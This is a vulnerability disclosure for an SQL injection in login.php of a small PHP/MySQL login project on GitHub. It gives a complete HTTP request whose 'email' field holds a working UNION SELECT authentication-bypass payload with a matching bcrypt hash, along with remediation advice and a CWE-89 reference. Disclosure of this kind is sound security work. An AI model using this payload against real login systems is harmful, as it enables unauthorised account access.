# keerti1924 / PHP-MYSQL-User-Login-System - login.php SQL Injection

## Vendor Homepage:
[PHP-MYSQL-User-Login-System](https://github.com/keerti1924/PHP-MYSQL-User-Login-System)

## Impact
The login.php script in keerti1924's PHP-MYSQL-User-Login-System is vulnerable to SQL injection (SQLi) attacks. Exploiting this flaw, attackers can bypass authentication by injecting malicious SQL code via the 'email' parameter. By crafting a UNION SELECT statement, an attacker can manipulate the query to retrieve unauthorized data, potentially compromising user credentials or gaining unauthorized access to the application. Moreover, to successfully exploit this vulnerability, the 'password' parameter must match the hash of the email payload password retrieved via the UNION SELECT statement, further amplifying the risk of unauthorized access.

## Proof of Concept
Step 1: Visit the /login.php\
Step 2: Open Browser Console\
Step 3: Run [SQLI Auth POC](https://raw.githubusercontent.com/skid-nochizplz/skid-nochizplz/main/TrashBin/CVE/keerti1924%20PHP-MYSQL-User-Login-System/SQLI%20Auth%20POC.js)\
Step 4: User will be redirected to home.php

## HTTP Request Example

```http request
POST /login.php HTTP/1.1
Host: 127.0.0.1:8080
Content-Type: application/x-www-form-urlencoded
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7

email = '%20UNION%20SELECT%201%20AS%20id%2c%20'NoChizPlz'%20AS%20username%2c%20'nochizplz%40nochizplz.com'%20AS%20email%2c%20'%242a%2412%24xkhwduBCkSl3tPhWVokC%2fOmrhboA0gxDWaVLl4uPLr2iSbXEtNdCq'%20AS%20password%20%23&password=nochizplz&login=Login
```

### Proof with Video:
![Vulnerability Proof](https://github.com/skid-nochizplz/skid-nochizplz/blob/main/TrashBin/CVE/keerti1924%20PHP-MYSQL-User-Login-System/SQLI%20Auth%20Proof.gif?raw=true)

## Remediation
To mitigate this SQL injection vulnerability, it is recommended to implement proper input validation and parameterized queries to prevent untrusted data from being directly interpreted as part of SQL commands. Additionally, enforcing principle of least privilege and ensuring strong authentication mechanisms can help minimize the impact of potential exploitation.

## CWE
[CWE-89: Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection')](https://cwe.mitre.org/data/definitions/89.html)